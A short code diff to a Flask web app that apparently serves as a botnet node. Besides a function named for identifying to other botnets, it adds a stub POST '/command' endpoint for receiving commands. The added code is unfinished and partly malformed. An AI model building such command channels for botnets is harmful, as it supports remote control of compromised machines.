@@ -1,3 +1,4 @@
+from commands.command import Command
 from typing import List, Tuple
 from flask import Flask
 import requests
@@ -53,3 +54,7 @@ def identify_to_other_botnets() -> Tuple(int, int):
 @app.route('/')
 def hello_world():  # put application's code here
     return 'Hello World!'
+
+@app.route('/command', methods = ['POST'])
+def onCommand(payload: any):
+    command: Command
